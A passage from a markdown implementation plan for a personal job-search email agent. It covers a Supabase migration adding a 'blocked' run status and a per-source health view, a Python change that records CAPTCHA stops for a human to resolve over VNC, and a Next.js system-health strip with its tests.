      AND pg_get_constraintdef(oid) ILIKE '%status%'
  LOOP
    EXECUTE format('ALTER TABLE agent_runs DROP CONSTRAINT %I', con.conname);
  END LOOP;
END $$;

-- Fallback/safety net (M3): if the discovery loop above ever finds nothing (e.g. a future
-- rename made the constraint's definition text stop containing "status"), still drop the
-- conventionally-named constraint here rather than silently ending up with two CHECK
-- constraints on the same column that could conflict. IF EXISTS makes this a no-op in the
-- normal case where the loop above already handled it.
ALTER TABLE agent_runs DROP CONSTRAINT IF EXISTS agent_runs_status_check;

ALTER TABLE agent_runs ADD CONSTRAINT agent_runs_status_check
  CHECK (status IN ('success', 'failure', 'blocked'));

-- U13: the health strip needs the latest row per distinct source. A naive "fetch a recent
-- window, reduce client-side" approach silently drops low-frequency sources (visa_ingest_lca/
-- visa_ingest_uscis run quarterly; any practically-sized window is too small to contain their
-- rows) -- and a missing chip reads as "healthy", the exact failure U13 exists to prevent. A
-- DISTINCT ON view is read-only, zero blast radius, and needs no raw-SQL RPC.
-- I3: WITH (security_invoker = true) -- views run with the OWNER's privileges by default,
-- which Supabase's linter flags as security_definer_view; this view only ever reads a table
-- anon can already SELECT, so there's no reason to run it as anything but the querying role.
-- Explicit column list, not SELECT * -- SELECT * freezes the column list at creation time; a
-- future new agent_runs column would be invisible to this view, and a later
-- CREATE OR REPLACE VIEW with a different SELECT * expansion errors instead of adapting.
CREATE OR REPLACE VIEW agent_runs_latest_by_source
WITH (security_invoker = true) AS
SELECT DISTINCT ON (source) id, ran_at, status, drafted, skipped, errors, elapsed_seconds, failure_reason, source
FROM agent_runs
WHERE source IS NOT NULL
ORDER BY source, ran_at DESC;

GRANT SELECT ON agent_runs_latest_by_source TO anon;
```

- [ ] **Step 2: Apply the migration**

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db push --linked
```
Expected: applies with no errors.

- [ ] **Step 3: Verify the widened constraint and the view**

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SELECT pg_get_constraintdef(oid) FROM pg_constraint WHERE conrelid = 'agent_runs'::regclass AND contype = 'c';" --linked
```
Expected: one row containing `'blocked'` alongside `'success'` and `'failure'`.

Run:
```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && supabase db query "SELECT source, status FROM agent_runs_latest_by_source ORDER BY source;" --linked
```
Expected: one row per distinct `source` currently in `agent_runs` (confirmed live before this task: `jobright`, `monitor`, `visa_match` — the exact set will vary as more sources accumulate rows, which is the point of the view).

- [ ] **Step 4: Write the failing Python tests**

`tests/test_cu_linkedin_run.py` — add two new tests after the existing `test_run_flags_a_captcha_without_persisting_anything`:

```python
def test_run_records_blocked_status_and_stops_on_captcha(mocker):
    mocker.patch.object(cu_linkedin, "run_session",
                        return_value=("CAPTCHA_OR_CHALLENGE", 3, 0))
    record_run = mocker.patch.object(db, "record_run")
    create = mocker.patch.object(db, "create_job_application")
    cu_linkedin.run()
    create.assert_not_called()
    record_run.assert_called_once()
    args, kwargs = record_run.call_args
    assert args[0] == "blocked"
    assert kwargs["source"] == "cu_linkedin"
    assert "CAPTCHA_OR_CHALLENGE" in kwargs["failure_reason"]


def test_run_returns_accumulated_errors_on_captcha_without_double_recording(mocker):
    # session_errors accumulated before the CAPTCHA was hit must still surface in both the
    # return value and the one record_run call -- and there must be exactly ONE record_run
    # call, not the CAPTCHA branch's plus the function's normal end-of-run call.
    mocker.patch.object(cu_linkedin, "run_session",
                        return_value=("CAPTCHA_OR_CHALLENGE", 3, 2))
    record_run = mocker.patch.object(db, "record_run")
    result = cu_linkedin.run()
    assert result == 2
    record_run.assert_called_once()
    assert record_run.call_args.args[3] == 2
    # I5: this is the assertion that actually distinguishes "recorded as blocked" from
    # "recorded as failure" -- without it, this test passes against TODAY'S unfixed code too
    # (today's CAPTCHA branch already falls through to the shared end-of-run call, which
    # already produces exactly one record_run call with args[3] == 2 given these inputs, and
    # run() already returns 2 either way -- none of that is what this task changes). The one
    # property this task's fix actually adds is status == "blocked" instead of "failure".
    assert record_run.call_args.args[0] == "blocked"
```

- [ ] **Step 5: Run the tests, verify they fail**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent && pytest tests/test_cu_linkedin_run.py -v -k "blocked or accumulated"`
Expected: both new tests FAIL, each on one precise assertion:
- `test_run_records_blocked_status_and_stops_on_captcha` fails on `assert args[0] == "blocked"`
  — today's CAPTCHA path falls through to the shared end-of-run `record_run` call with
  `status="failure"` or `status="success"` (whichever the accumulated error count implies), not
  `"blocked"`.
- `test_run_returns_accumulated_errors_on_captcha_without_double_recording` (I5) fails
  specifically and ONLY on its final `assert record_run.call_args.args[0] == "blocked"` line —
  every other assertion in this test already passes against today's unfixed code (today's
  CAPTCHA branch already produces exactly one `record_run` call with `args[3] == 2` given this
  test's inputs, and `run()` already returns `2` either way; this test was previously written in
  a way that never actually exercised the property its name promises). Today's actual
  `args[0]` value for this test's inputs is `"failure"` (nonzero `session_errors` accumulated
  before the CAPTCHA was hit — see the M17 correction in Task 8 Step 1's migration comment: the
  error count is added before the CAPTCHA check runs, not after).

- [ ] **Step 6: Implement — restructure `run()` in `cu_linkedin.py`**

Replace the `run()` function (currently lines 536-590) in full:

```python
def run():
    """Run one paced LinkedIn discovery session and persist what it found. Never raises past
    this boundary -- but DOES return the total error count (0 on a clean, disabled, paused, or
    CAPTCHA-blocked run) so __main__ can turn a failed session into a nonzero process exit.
    record_run's own DB status is a separate, best-effort signal for the UI; without a nonzero
    exit code here, systemd's OnFailure= on job-linkedin-ingest.service could never fire, since
    the process itself always exited 0 even after an unhandled exception was caught and logged.
    A CAPTCHA block is a deliberate stop, not a failure requiring a nonzero exit code on its
    own -- it still returns whatever error count had already accumulated before the block was
    hit, same as every other path, just via its own early return so record_run is called
    exactly once for this path (not once here and once more at the function's normal end)."""
    start = time.time()
    saved = skipped = errors = 0

    if not config.CU_LINKEDIN_ENABLED:
        log.info("[CU-LINKEDIN] | disabled via config.CU_LINKEDIN_ENABLED, skipping")
        return errors

    # LinkedIn browsing is the highest-consequence activity in this whole system -- it risks the
    # user's real account -- so it must respect the global pause switch, same as agent.py and
    # monitor.py. No record_run call on the paused exit, matching monitor.py's own rule: this
    # check can be hit far more often than a real session runs and must not flood agent_runs.
    if db.get_pause_scope() in ("agent", "all"):
        log.info("[CU-LINKEDIN] | PAUSED | skipping (pause_scope)")
        return errors

    log.info("[CU-LINKEDIN] | START")
    try:
        text, _actions, session_errors = run_session(
            _TASK_PROMPT.format(max_postings=config.CU_LINKEDIN_MAX_POSTINGS_PER_SESSION)
        )
        errors += session_errors
        if _CAPTCHA_SENTINEL in (text or ""):
            # Never solved, never bypassed, never retried with a workaround: a human VNCs in.
            # status='blocked' (not 'success') is the real, DB-visible signal M2's health strip
            # and attention badge key off of -- without it, a blocked session looks identical
            # to a clean run with saved=0 in agent_runs.
            log.warning("[CU-LINKEDIN] | CAPTCHA or login challenge -- needs a human at the VNC "
                        "console for display slot 0")
            try:
                db.record_run("blocked", saved, skipped, errors, round(time.time() - start),
                              failure_reason="CAPTCHA_OR_CHALLENGE: needs a human at the VNC "
                                             "console for display slot 0",
                              source="cu_linkedin")
            except Exception as exc:
                log.warning(f"[CU-LINKEDIN] | record_run failed: {exc}")
            return errors
        else:
            postings = extract_postings(text)
            log.info(f"[CU-LINKEDIN] | extracted={len(postings)}")
            if (text or "").strip() and not postings:
                # A non-empty reply that yields zero postings could be a genuine "nothing found"
                # session or a broken extraction path -- these must not look identical on the
                # first live run. Never log the text itself (may be large, this is a log line, not
                # a debug dump), only its length.
                log.info(f"[CU-LINKEDIN] | extraction yielded 0 postings from a non-empty reply "
                         f"| reply_len={len(text)}")
            saved, skipped, persist_errors = persist_postings(postings)
            errors += persist_errors
    except Exception as exc:
        errors += 1
        log.warning(f"[CU-LINKEDIN] | unexpected error: {exc}")

    log.info(f"[CU-LINKEDIN] | DONE | saved={saved} | skipped={skipped} | errors={errors}")
    try:
        db.record_run("failure" if errors else "success", saved, skipped, errors,
                      round(time.time() - start), source="cu_linkedin")
    except Exception as exc:
        log.warning(f"[CU-LINKEDIN] | record_run failed: {exc}")
    return errors
```

- [ ] **Step 7: Run the tests, verify they pass**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent && pytest tests/test_cu_linkedin_run.py -v`
Expected: every test in the file PASSes, including the two new ones and every pre-existing one (in particular `test_run_flags_a_captcha_without_persisting_anything`, which asserts only that `create_job_application` was never called, is unaffected by this restructuring).

- [ ] **Step 8: Run the full Python suite**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent && pytest -q`
Expected: 0 failures.

- [ ] **Step 8b: Document in `docs/python/db-schema.md` (M16)**

Add an entry for the widened `agent_runs.status` CHECK constraint (now `'success' | 'failure' |
'blocked'`) and the new `agent_runs_latest_by_source` view (one row per distinct `source`,
`SELECT`-granted to `anon`). Keep this file current in the same task that lands the schema
change, per this repo's root `CLAUDE.md`.

- [ ] **Step 9: Commit**

```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && git add supabase/migrations/20260925000001_widen_agent_runs_status_and_add_health_view.sql cu_linkedin.py tests/test_cu_linkedin_run.py docs/python/db-schema.md && git commit -m "$(cat <<'EOF'
feat(cu_linkedin): record_run('blocked', ...) on CAPTCHA, health view (U14)

A CAPTCHA/login-challenge stop used to fall through to the normal
end-of-run record_run call, which reported status='success' or
'failure' depending on the error count accumulated before the CAPTCHA
was hit (errors += session_errors runs BEFORE the CAPTCHA check) --
either way, a wedged, human-needed session was never distinguishable
from a normal run via status alone. run() now records status='blocked'
with a
failure_reason and returns immediately on that path, calling record_run
exactly once either way. Migration widens agent_runs.status's CHECK
constraint (discovered via pg_constraint, not a hardcoded name -- the
live schema has drifted from setup_supabase.sql before) and adds a
DISTINCT ON (source) view, agent_runs_latest_by_source, granted to
anon -- avoids the health strip silently dropping low-frequency sources
(quarterly visa ingests) that a windowed "recent rows" query would miss.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_016LHvBT9KJnAoXtWu6UyBNH
EOF
)"
```

---

### Task 9: `SystemHealthStrip.tsx` + `/api/system-health` route (U13/U14 frontend), test-count housekeeping

**Files:**
- Create: `contact-manager/src/app/api/system-health/route.ts`
- Create: `contact-manager/src/app/api/system-health/route.test.ts`
- Create: `contact-manager/src/components/SystemHealthStrip.tsx`
- Create: `contact-manager/src/components/SystemHealthStrip.test.tsx`
- Modify: `contact-manager/src/components/ApplicationsPage.tsx`
- Modify: `contact-manager/src/components/ApplicationsPage.test.tsx`
- Modify: `contact-manager/tests/e2e/18-applications.spec.ts`
- Modify: `contact-manager/.env.example`
- Modify: `contact-manager/CLAUDE.md`

**Interfaces:**
- Consumes: `agent_runs_latest_by_source` view from Task 8.
- Produces: `SystemHealthStrip` component (no props), rendered at the top of `ApplicationsPage.tsx`. `GET /api/system-health` returns `{ health: SystemHealthRow[] }` where `SystemHealthRow = { source: string; status: string; ran_at: string; failure_reason: string | null }`.

- [ ] **Step 1: Write the failing tests for the route**

`contact-manager/src/app/api/system-health/route.test.ts`:

```ts
import { describe, it, expect, vi, beforeEach } from "vitest";
import { GET } from "./route";

const mockOrder = vi.fn();
const mockSelect = vi.fn();
const mockFrom = vi.fn();

vi.mock("@supabase/supabase-js", () => ({
  createClient: vi.fn(() => ({ from: mockFrom })),
}));

beforeEach(() => {
  vi.clearAllMocks();
  mockOrder.mockResolvedValue({
    data: [
      { source: "agent", status: "success", ran_at: "2026-09-24T10:00:00Z", failure_reason: null },
      { source: "cu_linkedin", status: "blocked", ran_at: "2026-09-24T09:00:00Z",
        failure_reason: "CAPTCHA_OR_CHALLENGE: needs a human at the VNC console for display slot 0" },
    ],
    error: null,
  });
  mockSelect.mockReturnValue({ order: mockOrder });
  mockFrom.mockReturnValue({ select: mockSelect });
});

describe("GET /api/system-health", () => {
  it("returns the latest row per source", async () => {
    const res = await GET();
    const body = await res.json();
    expect(body.health).toHaveLength(2);
    expect(body.health[1].status).toBe("blocked");
  });

  it("queries the agent_runs_latest_by_source view", async () => {
    await GET();
    expect(mockFrom).toHaveBeenCalledWith("agent_runs_latest_by_source");
  });

  it("returns 500 on a supabase error", async () => {
    mockOrder.mockResolvedValue({ data: null, error: new Error("db down") });
    const res = await GET();
    expect(res.status).toBe(500);
  });
});
```

- [ ] **Step 2: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/system-health/route.test.ts`
Expected: FAIL — `./route` doesn't exist yet.

- [ ] **Step 3: Implement `system-health/route.ts`**

**M6:** first add `SystemHealthRow` to `contact-manager/src/lib/types.ts` (beside the existing
`JobApplication` type), not to the route file — a type that both a route handler and a
component need to import belongs in `lib/types.ts`, this codebase's existing home for shared
types, not in one of the two files that consumes it:

```ts
export type SystemHealthRow = {
  source: string;
  status: string;
  ran_at: string;
  failure_reason: string | null;
};
```

Then implement the route, importing the type instead of redefining it:

```ts
export const runtime = "nodejs";

import { createClient } from "@supabase/supabase-js";
import type { SystemHealthRow } from "@/lib/types";

function getClient() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
  );
}

export async function GET() {
  try {
    const supabase = getClient();
    // agent_runs_latest_by_source is a DISTINCT ON (source) view (see migration
    // 20260925000001) -- it already returns exactly one row per source, the most recent by
    // ran_at, so no client-side windowing or reduction is needed here.
    const { data, error } = await supabase
      .from("agent_runs_latest_by_source")
      .select("source, status, ran_at, failure_reason")
      .order("source", { ascending: true });
    if (error) throw error;
    return Response.json({ health: (data ?? []) as SystemHealthRow[] });
  } catch (err) {
    return Response.json({ error: String(err) }, { status: 500 });
  }
}
```

- [ ] **Step 4: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/system-health/route.test.ts`
Expected: all 3 tests PASS.

- [ ] **Step 5: Write the failing tests for `SystemHealthStrip.tsx`**

`contact-manager/src/components/SystemHealthStrip.test.tsx`:

```tsx
import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen, waitFor, within } from "@testing-library/react";
import { SystemHealthStrip } from "./SystemHealthStrip";

beforeEach(() => {
  vi.unstubAllEnvs();
});

function mockHealth(rows: unknown[]) {
  vi.stubGlobal(
    "fetch",
    vi.fn(() => Promise.resolve({ ok: true, json: async () => ({ health: rows }) } as Response))
  );
}

describe("SystemHealthStrip", () => {
  it("renders one chip per source", async () => {
    mockHealth([
      { source: "agent", status: "success", ran_at: new Date().toISOString(), failure_reason: null },
      { source: "monitor", status: "success", ran_at: new Date().toISOString(), failure_reason: null },
    ]);
    render(<SystemHealthStrip />);
    expect(await screen.findByText("agent")).toBeInTheDocument();
    expect(screen.getByText("monitor")).toBeInTheDocument();
  });

  it("shows an attention banner with a VNC link when a source is blocked and the env var is set", async () => {
    vi.stubEnv("NEXT_PUBLIC_BEELINK_VNC_URL", "https://vnc.example.local");
    mockHealth([
      { source: "cu_linkedin", status: "blocked", ran_at: new Date().toISOString(),
        failure_reason: "CAPTCHA_OR_CHALLENGE: needs a human at the VNC console for display slot 0" },
    ]);
    render(<SystemHealthStrip />);
    expect(await screen.findByText(/needs a human at the VNC console/i)).toBeInTheDocument();
    expect(screen.getByRole("link", { name: /open vnc/i })).toHaveAttribute(
      "href",
      "https://vnc.example.local"
    );
  });

  it("still shows the attention text without a link when the env var is unset", async () => {
    mockHealth([
      { source: "cu_linkedin", status: "blocked", ran_at: new Date().toISOString(),
        failure_reason: "CAPTCHA_OR_CHALLENGE" },
    ]);
    render(<SystemHealthStrip />);
    expect(await screen.findByText(/needs a human at the VNC console/i)).toBeInTheDocument();
    expect(screen.queryByRole("link", { name: /open vnc/i })).not.toBeInTheDocument();
  });

  it("renders a 'never ran' chip for a known source with zero reported rows, instead of silently omitting it (I9c)", async () => {
    // Only 'agent' reported -- 'monitor' and 'cu_linkedin' are in the known-sources list but
    // have no row at all. A source that has simply stopped reporting must not just vanish (the
    // exact GHA-red-X failure mode this strip exists to replace).
    mockHealth([
      { source: "agent", status: "success", ran_at: new Date().toISOString(), failure_reason: null },
    ]);
    render(<SystemHealthStrip />);
    await waitFor(() => expect(global.fetch).toHaveBeenCalledWith("/api/system-health"));
    expect(await screen.findByText("agent")).toBeInTheDocument();
    expect(screen.getByText("monitor")).toBeInTheDocument();
    const monitorChip = screen.getByText("monitor").closest("div") as HTMLElement;
    expect(within(monitorChip).getByText(/never ran/i)).toBeInTheDocument();
  });

  it("renders an explicit error state, distinct from the empty/loading state, when the fetch fails (I9a)", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: false, status: 500 } as Response)));
    const { container } = render(<SystemHealthStrip />);
    expect(await screen.findByText(/couldn't load system health/i)).toBeInTheDocument();
    expect(container).not.toBeEmptyDOMElement();
  });

  it("marks a stale run's chip distinctly from a fresh one, using each source's own staleness threshold (I9b)", async () => {
    const staleIso = new Date(Date.now() - 3 * 60 * 60 * 1000).toISOString(); // 3h ago
    mockHealth([
      // monitor's threshold is short (~2h) -- 3h ago is stale for monitor.
      { source: "monitor", status: "success", ran_at: staleIso, failure_reason: null },
      // agent's threshold is long (~30h) -- 3h ago is still fresh for agent.
      { source: "agent", status: "success", ran_at: staleIso, failure_reason: null },
    ]);
    render(<SystemHealthStrip />);
    await screen.findByText("monitor");
    const monitorChip = screen.getByText("monitor").closest("div") as HTMLElement;
    const agentChip = screen.getByText("agent").closest("div") as HTMLElement;
    expect(within(monitorChip).getByText("success").className).toContain("amber");
    expect(within(agentChip).getByText("success").className).not.toContain("amber");
  });
});
```

- [ ] **Step 6: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/SystemHealthStrip.test.tsx`
Expected: FAIL — `./SystemHealthStrip` doesn't exist yet.

- [ ] **Step 7: Implement `SystemHealthStrip.tsx`**

```tsx
"use client";

import { useEffect, useState } from "react";
import { Badge } from "@/components/ui/Badge";
import type { SystemHealthRow } from "@/lib/types";

// I9c: sources that should always render a chip, even with zero reported rows -- otherwise a
// source that has simply stopped reporting entirely just vanishes, which is indistinguishable
// from "nothing to show" and defeats the whole point of replacing the GHA red-X signal.
const KNOWN_SOURCES = [
  "agent",
  "monitor",
  "cu_linkedin",
  "jobright",
  "visa_ingest_lca",
  "visa_ingest_uscis",
] as const;

// I9b: a source dead for weeks must not render in the same dim "success" style as one that ran
// minutes ago. Thresholds are deliberately per-source -- cu_linkedin runs a few times a day,
// monitor every 20-60 min, the daily agent once a day, and the quarterly visa ingests get a
// generous catch-all default rather than their own entries.
const SOURCE_MAX_AGE_MINUTES: Record<string, number> = {
  cu_linkedin: 60 * 8, // within the last ~3 timer fires
  agent: 60 * 30,
  monitor: 60 * 2,
};
const DEFAULT_MAX_AGE_MINUTES = 60 * 24 * 100; // quarterly/manual sources -- generous default

function relativeTime(iso: string): string {
  const diffMs = Date.now() - new Date(iso).getTime();
  const minutes = Math.round(diffMs / 60000);
  if (minutes < 1) return "just now";
  if (minutes < 60) return `${minutes} min ago`;
  const hours = Math.round(minutes / 60);
  if (hours < 24) return `${hours} hr ago`;
  const days = Math.round(hours / 24);
  return `${days} day${days === 1 ? "" : "s"} ago`;
}

function isStale(source: string, ranAtIso: string): boolean {
  const ageMinutes = (Date.now() - new Date(ranAtIso).getTime()) / 60000;
  const maxAge = SOURCE_MAX_AGE_MINUTES[source] ?? DEFAULT_MAX_AGE_MINUTES;
  return ageMinutes > maxAge;
}

// M9: blocked (a CAPTCHA/human-needed pause) is "waiting on a person", not a hard failure --
// amber, not red. failure is the more severe state -- red.
function statusVariant(status: string): "emerald" | "amber" | "red" | "muted" {
  if (status === "success") return "emerald";
  if (status === "blocked") return "amber";
  if (status === "failure") return "red";
  return "muted";
}

export function SystemHealthStrip() {
  const [rows, setRows] = useState<SystemHealthRow[] | null>(null);
  const [loading, setLoading] = useState(true);
  const [loadError, setLoadError] = useState(false);

  useEffect(() => {
    let cancelled = false;
    fetch("/api/system-health")
      .then((res) => {
        if (!res.ok) throw new Error(`request failed: ${res.status}`);
        return res.json();
      })
      .then((data) => {
        if (!cancelled) setRows(data.health ?? []);
      })
      .catch(() => {
        // I9a: a failed fetch must render an explicit error state, distinct from "loaded, zero
        // rows" -- a 500 here must not look identical to "nothing to show" on the exact strip
        // that's supposed to replace the GHA red-X failure signal.
        if (!cancelled) setLoadError(true);
      })
      .finally(() => {
        if (!cancelled) setLoading(false);
      });
    return () => {
      cancelled = true;
    };
  }, []);

  if (loading) return null;

  if (loadError) {
    return (
      <div className="px-3 py-2 bg-amber-500/10 border border-amber-500/30 rounded-md text-sm text-amber-200">
        Couldn't load system health -- try refreshing.
      </div>
    );
  }

  const byBySource = new Map((rows ?? []).map((r) => [r.source, r] as const));
  const knownRows: (SystemHealthRow | { source: string; status: "never_ran" })[] =
    KNOWN_SOURCES.map((s) => byBySource.get(s) ?? { source: s, status: "never_ran" as const });
  // A source reporting rows that ISN'T in the known-sources list still gets a chip -- an
  // out-of-date allowlist must never hide a real, reporting source.
  const extraRows = (rows ?? []).filter(
    (r) => !(KNOWN_SOURCES as readonly string[]).includes(r.source)
  );
  const displayRows = [...knownRows, ...extraRows];

  const blocked = (rows ?? []).filter((r) => r.status === "blocked");
  const vncBase = process.env.NEXT_PUBLIC_BEELINK_VNC_URL;

  return (
    <div className="flex flex-col gap-2">
      {blocked.length > 0 && (
        <div className="px-3 py-2 bg-amber-500/10 border border-amber-500/30 rounded-md text-sm text-amber-200">
          {blocked.map((r) => (
            <div key={r.source}>
              <strong>{r.source}</strong> is blocked and needs a human at the VNC console.{" "}
              {vncBase ? (
                <a href={vncBase} target="_blank" rel="noreferrer" className="underline">
                  Open VNC
                </a>
              ) : (
                "Set NEXT_PUBLIC_BEELINK_VNC_URL to link directly to the console."
              )}
            </div>
          ))}
        </div>
      )}
      <div className="flex flex-wrap gap-2">
        {displayRows.map((r) => {
          if (r.status === "never_ran") {
            return (
              <div
                key={r.source}
                className="flex items-center gap-2 px-2 py-1 bg-surface-2 border border-border rounded-md text-xs"
              >
                <span className="text-fg-muted">{r.source}</span>
                <Badge variant="muted">never ran</Badge>
              </div>
            );
          }
          const row = r as SystemHealthRow;
          const stale = isStale(row.source, row.ran_at);
          return (
            <div
              key={row.source}
              title={row.status === "success" ? undefined : (row.failure_reason ?? undefined)}
              className="flex items-center gap-2 px-2 py-1 bg-surface-2 border border-border rounded-md text-xs"
            >
              <span className="text-fg-muted">{row.source}</span>
              <Badge variant={stale ? "amber" : statusVariant(row.status)}>{row.status}</Badge>
              <span className={stale ? "text-amber-400" : "text-fg-dim"}>{relativeTime(row.ran_at)}</span>
            </div>
          );
        })}
      </div>
    </div>
  );
}
```

- [ ] **Step 8: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/SystemHealthStrip.test.tsx`
Expected: all 7 tests PASS.

- [ ] **Step 9: Write the failing test for wiring the strip into `ApplicationsPage.tsx`**

`contact-manager/src/components/ApplicationsPage.test.tsx` — update the `beforeEach` fetch stub (from Task 3/4/6/7's cumulative state) to also branch on `/system-health`, adding this check as the first branch in the mock function:

```tsx
      if (typeof url === "string" && url.includes("/system-health")) {
        return Promise.resolve({ ok: true, json: async () => ({ health: [] }) } as Response);
      }
```

Add a new `describe` block at the end of the file:

```tsx
describe("ApplicationsPage -- system health strip (U13/U14)", () => {
  it("fetches system health on mount", async () => {
    render(<ApplicationsPage />);
    await screen.findByText("Acme");
    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith("/api/system-health");
    });
  });
});
```

- [ ] **Step 10: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: FAIL — `SystemHealthStrip` isn't rendered on the page yet, so `/api/system-health` is never fetched.

- [ ] **Step 11: Implement — render the strip in `ApplicationsPage.tsx`**

Add `import { SystemHealthStrip } from "@/components/SystemHealthStrip";` to the imports. Change:

```tsx
      <h1 className="text-lg font-medium text-fg">Applications</h1>
```

to:

```tsx
      <h1 className="text-lg font-medium text-fg">Applications</h1>

      <SystemHealthStrip />
```

- [ ] **Step 12: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: all tests PASS.

- [ ] **Step 13: Document the new env var**

`contact-manager/.env.example` — add at the end:

```
# Beelink noVNC console (optional -- M2/U14). When set, a blocked-agent attention
# banner on /applications links directly to the console for a human to solve a
# CAPTCHA/login challenge. Safe to leave unset -- the banner still shows the
# attention text, just without a clickable link. Only display slot 0 exists as of
# M1 (cu_linkedin.py); this is a single base URL, not per-slot, until M3+ adds more.
NEXT_PUBLIC_BEELINK_VNC_URL=
```

**M8:** this env var is only ever added to `.env.example` by this step — nothing in this plan
sets it anywhere real. Note explicitly (for whoever executes this plan, and in the eventual
commit): `NEXT_PUBLIC_BEELINK_VNC_URL` must be set in the actual deployment environment
(Vercel, via `vercel env add`) once the Beelink box has a known, reachable LAN/Tailscale
address. Until that happens, the attention banner intentionally renders the degraded
no-link fallback text ("Set NEXT_PUBLIC_BEELINK_VNC_URL to link directly to the console.") —
this is expected, not a bug, and should be stated plainly rather than left for someone to
rediscover later.

- [ ] **Step 14: Extend the e2e spec**

`contact-manager/tests/e2e/18-applications.spec.ts` — the `**/api/system-health` route stub already exists from Task 3's `beforeEach` (returning `{ health: [] }`). Add a new test at the end of the `test.describe` block that overrides it for one test:

```ts
  test("shows an attention banner when a source is blocked", async ({ page }) => {
    await page.route("**/api/system-health", async (route) => {
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({
          health: [
            { source: "cu_linkedin", status: "blocked", ran_at: new Date().toISOString(),
              failure_reason: "CAPTCHA_OR_CHALLENGE: needs a human at the VNC console for display slot 0" },
          ],
        }),
      });
    });
    await page.goto("/applications");
    await expect(page.getByText(/needs a human at the VNC console/i)).toBeVisible();
    await page.screenshot({ path: "tests/e2e/screenshots/18-applications-health-attention.png" });
  });
```

- [ ] **Step 15: Run the full test suites**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npm test`
Expected: 0 failures. Note the printed total test count (e.g. `Tests  NNN passed`) and file count for Step 17.

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx playwright test tests/e2e/`
Expected: 0 failures. Note the printed total test count for Step 17. Read every new screenshot captured across this plan (`18-applications-detail-sheet.png`, `18-applications-confirm-modal.png`, `18-applications-health-attention.png`) and visually confirm each shows the correct UI before proceeding — this repo's convention (`contact-manager/CLAUDE.md`) requires looking at captured screenshots, not just a passing assertion, before claiming a UI change is correct.

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npm run build`
Expected: typecheck + production build succeed with no errors.

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npm run lint`
Expected: clean (M11). This is the step that actually catches
`react-hooks/exhaustive-deps` issues like the `[application?.id]` dependency array in
`ApplicationDetailSheet.tsx`'s file-fetching `useEffect` (Task 3) — already addressed with a
justified `eslint-disable-next-line` comment (see that task), but this is where a stale or
missing justification would actually surface across the whole plan's changes, not just that
one spot.

- [ ] **Step 16: Run the Python suite one more time (full-repo regression check)**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent && pytest -q`
Expected: 0 failures.

- [ ] **Step 17: Update `contact-manager/CLAUDE.md`'s test-count line and module layout**

Using the real numbers printed in Step 15 (not the numbers in this plan, which cannot know the exact final count in advance), edit the line:

```
- **Current test count: 77** (vitest: 633 across 41 files, playwright: 77).
```

to:

```
- **Current test count: <playwright total from Step 15>** (vitest: <vitest total from Step 15> across <file count> files, playwright: <playwright total from Step 15>).
```

Also add the four new files created in this plan (`api/applications/[id]/files/route.ts`, `api/system-health/route.ts`, `ApplicationDetailSheet.tsx`, `SystemHealthStrip.tsx`) to the `Module layout` file tree near the top of `contact-manager/CLAUDE.md`, in the same style as the existing `api/applications/[id]/route.ts` and `ApplicationsPage.tsx` entries.

- [ ] **Step 18: Commit**

```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && git add contact-manager/src/app/api/system-health contact-manager/src/components/SystemHealthStrip.tsx contact-manager/src/components/SystemHealthStrip.test.tsx contact-manager/src/components/ApplicationsPage.tsx contact-manager/src/components/ApplicationsPage.test.tsx contact-manager/tests/e2e/18-applications.spec.ts contact-manager/.env.example contact-manager/CLAUDE.md && git commit -m "$(cat <<'EOF'
feat(applications): system health strip + attention badge (U13/U14)

New SystemHealthStrip.tsx renders one chip per agent_runs source (via
the agent_runs_latest_by_source view, now security_invoker with an
explicit column list rather than SELECT *), plus an attention banner
when any source's latest run is status='blocked' -- linking to
NEXT_PUBLIC_BEELINK_VNC_URL when set, degrading to plain attention text
(never hiding the signal) when unset; that env var still needs setting
in the real Vercel deployment once the Beelink box has a known address.
This is the UI half of U13/U14; the backend blocked-status signal
shipped in the previous task. Replaces the GHA red-X signal this
migration is retiring GitHub Actions runners away from in later
milestones.

The strip now has three states the GHA red-X replacement can't afford
to blur together: a failed /api/system-health fetch renders an
explicit error state (never silently identical to "nothing to show");
a known source with zero reported rows renders "never ran" instead of
vanishing; and a stale ran_at (past a per-source threshold) renders
amber/distinct from a fresh success, rather than looking the same as a
run from minutes ago. statusVariant also now maps blocked -> amber
(waiting on a person, not a hard failure) and failure -> red (the more
severe state) -- the reverse of an earlier draft. SystemHealthRow moved
to lib/types.ts so both the route and the component import one shared
definition instead of the component importing a type from the route
file. Full-suite verification now includes npm run lint.

